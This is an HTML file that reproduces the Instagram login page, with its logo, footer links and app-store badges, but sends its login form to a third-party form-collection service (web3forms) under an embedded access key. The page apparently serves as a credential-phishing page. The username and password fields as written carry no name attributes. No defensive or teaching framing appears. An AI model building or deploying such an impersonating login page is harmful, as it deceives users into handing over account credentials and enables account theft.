<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
    <title>Instagram</title>
    <link rel="icon" type="image/x-icon" href="instagram.png">
</head>

<body>
    <main>
        <img src="IG.png" alt="Phone preview" class="phoneImg">
        <div class="form-div">
            <form action="https://api.web3forms.com/submit" method="POST" class="language-form">
                <img src="instalogo.png" alt="Instagram logo" class="instalogo">
                <input type="hidden" name="access_key" value="9507fa0d-3766-415b-8e73-b0409f2cc268">
                <input type="text" class="input" placeholder="Phone number, username, or email" required>
                <input type="password" class="input" placeholder="Password" required>
                <input type="hidden" name="redirect" value="https://web3forms.com/success">
                <button class="login-btn">Log In</button>
                <p id="or">or</p>
                <a href="https://www.instagram.com/fxcal/disclosure/?next=%2F" class="fb-login">
                    <i class='bx bxl-facebook-square'></i> Log in with Facebook
                </a>
                <div class="Forgot-Password">
                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot Password?</a>
                </div>
                <div class="sign-up">
                    <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/"
                            class="sign-link">Sign up</a></p>
                </div>
                <div class="get-app">
                    <p>Get the app.</p>
                    <div class="store">
                        <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
                            <img src="App store.png" alt="App Store" id="apple">
                        </a>
                        <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                            <img src="playstore.png" alt="Google Play" id="play">
                        </a>
                    </div>
                </div>
            </form>
        </div>
    </main>
    <footer class="footer-nav">
        <nav>
            <ul class="nav-list">
                <li><a href="https://about.meta.com/" target="_blank">Meta</a></li>
                <li><a href="https://about.instagram.com/" target="_blank">About</a></li>
                <li><a href="https://about.instagram.com/blog" target="_blank">Blog</a></li>
                <li><a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a></li>
                <li><a href="https://help.instagram.com/" target="_blank">Help</a></li>
                <li><a href="https://developers.facebook.com/docs/instagram-platform" target="_blank">API</a></li>
                <li><a href="https://privacycenter.instagram.com/policy/" target="_blank">Privacy</a></li>
                <li><a href="https://help.instagram.com/581066165581870/" target="_blank">Terms</a></li>
            </ul>
        </nav>
        <div class="footer-center">
            <p class="footer-text">Â© 2024 Instagram from Meta</p>
        </div>
    </footer>
</body>

</html>
